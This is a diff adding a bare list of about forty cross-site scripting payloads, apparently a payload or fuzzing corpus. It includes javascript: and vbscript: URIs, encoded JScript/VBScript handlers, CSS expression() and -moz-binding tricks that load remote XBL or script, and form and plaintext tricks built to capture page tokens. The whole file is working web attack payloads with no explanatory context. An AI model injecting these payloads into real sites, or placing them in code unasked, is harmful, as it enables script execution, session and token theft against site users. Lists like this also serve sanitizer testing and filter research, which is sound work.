@@ -1,0 +1,40 @@
+<img src="javascript:alert(1)">
+<body background="javascript:alert(1)">
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+<a href="vbscript:MsgBox+1">XSS</a>
+<a href="#" onclick="vbs:Msgbox+1">XSS</a>
+<a href="#" onclick="VBS:Msgbox+1">XSS</a>
+<a href="#" onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>
+<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+<a href="#" onclick="jscript.compact:alert(1);">test</a>
+<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<a title="&{alert(1)}">XSS</a>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<form><button name=x formaction=x><b>stealme
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">
+<div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">
+<div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
+<div style=xss=expression(alert(1))>
+<div style="color&#x3dred">test</div>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+<script>function window.onload(){alert(1);}</script>
+<script>function window::onload(){alert(1);}</script>
+<script>function window.location(){}</script>
+<body><script>function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}</script></body>
+<body><script>function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; }</script></body>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
